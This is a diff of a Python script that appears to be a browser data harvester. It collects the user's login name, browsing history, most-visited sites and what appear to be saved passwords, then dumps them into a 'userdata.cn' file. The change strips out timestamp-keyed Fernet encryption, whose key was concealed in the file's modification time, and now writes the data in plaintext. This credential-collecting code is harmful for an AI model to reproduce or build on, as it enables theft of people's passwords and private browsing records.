@@ -1,17 +1,13 @@
 import sys
 import os
 import json
-
-# used for fernet encryption
 import time
-from cryptography.fernet import Fernet
-import base64
 import hashlib
 
 import chromiumBrowser
 import dataComprehention
 import getBrowser
-
+import aesCryptography
 
 if len(sys.argv) < 2: exit()
 
@@ -49,26 +45,27 @@ topWebsites = dataComprehention.topWebsitesVisited(history)
 # clear the temp folder to remove clutter
 #defaultBrowser.cleanup()
 
-
 username = os.getlogin()
 
+
 outputFilePath = os.path.join(sys.argv[1], "userdata.cn")
-key = round(time.time())
-sha256Bytes = hashlib.sha256(str(key).encode()).digest()[:32]
-b64Key = base64.urlsafe_b64encode(sha256Bytes)
-
-def encryptString(key, inputString):
-    encrypter = Fernet( key )
-    bytes = encrypter.encrypt(inputString.encode())
-    return bytes
-
-with open(outputFilePath, "wb") as f:    
+with open(outputFilePath, "w") as f:
     f.writelines([
-        encryptString(b64Key, username), b"\n",
-        encryptString(b64Key, json.dumps( history )), b"\n",
-        encryptString(b64Key, json.dumps( topWebsites )), b"\n",
-        encryptString(b64Key, json.dumps( passwordsAndFreq )), b"\n",
+        username, "\n",
+        json.dumps(history), "\n",
+        json.dumps( topWebsites ), "\n",
+        json.dumps( passwordsAndFreq ), "\n",
     ])
 
+"""
+with open(outputFilePath, "wb") as f:
+    f.writelines([
+        aesCryptography.encrypt(byteKey, username), b"\n",
+        aesCryptography.encrypt(byteKey, json.dumps( history )), b"\n",
+        aesCryptography.encrypt(byteKey, json.dumps( topWebsites )), b"\n",
+        aesCryptography.encrypt(byteKey, json.dumps( passwordsAndFreq )), b"\n",
+    ])
+"""
+
 # Sets the date modified so the key is present and changes everytime encrypted
-os.utime(outputFilePath, (key, key))
+#os.utime(outputFilePath, (key, key))
